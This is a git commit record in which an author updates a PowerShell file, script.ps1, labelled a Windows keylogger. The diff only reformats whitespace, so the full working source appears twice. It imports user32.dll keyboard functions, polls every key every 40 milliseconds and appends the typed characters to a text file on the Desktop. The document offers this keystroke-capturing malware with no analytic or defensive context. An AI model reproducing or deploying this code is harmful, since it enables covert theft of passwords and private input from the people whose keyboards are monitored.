95f6a618b7472d90b692beddbe561616c2f052ea
C4sp3r <55068123+C4sp3r2222@users.noreply.github.com>
2025-08-12 17:02:12 +0200

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,9 +1,9 @@
 # Windows Keylogger:
 $path = "$env:USERPROFILE\Desktop\keylogger.txt"
 
-if ((Test-Path $path) -eq $false) { New-Item $path }
+if ((Test-Path $path) -eq $false) {New-Item $path}
 
-$signatures = @'
+    $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
 public static extern short GetAsyncKeyState(int virtualKeyCode);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -14,34 +14,46 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
-$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    
+    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    
 
-try {
-    while ((Test-Path $path) -ne $false) {
-        Start-Sleep -Milliseconds 40
+    try {
+        
+        while ((Test-Path $path) -ne $false){
 
-        for ($ascii = 9; $ascii -le 254; $ascii++) {
-            $state = $API::GetAsyncKeyState($ascii)
+           
 
-            if ($state -eq -32767) {
-                $null = [console]::CapsLock
+            Start-Sleep -Milliseconds 40
 
-                $virtualKey = $API::MapVirtualKey($ascii, 3)
+            
+            for ($ascii = 9; $ascii -le 254; $ascii++) {
+                
+                $state = $API::GetAsyncKeyState($ascii)
 
-                $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
-                $checkkbstate = $API::GetKeyboardState($kbstate)
+                
+                if ($state -eq -32767) {
+                    $null = [console]::CapsLock
 
-                $mychar = New-Object -TypeName System.Text.StringBuilder
+                    
+                    $virtualKey = $API::MapVirtualKey($ascii, 3)
 
-                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+                    
+                    $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
+                    $checkkbstate = $API::GetKeyboardState($kbstate)
 
-                if ($success -and (Test-Path $path) -eq $true) {
-                    [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
+                    
+                    $mychar = New-Object -TypeName System.Text.StringBuilder
+
+                    
+                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+
+                    if ($success -and (Test-Path $path) -eq $true) {
+                       
+                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
+                    }
                 }
             }
         }
-    }
-}
-finally {
-    exit
-}
+    } 
+     finally {exit}
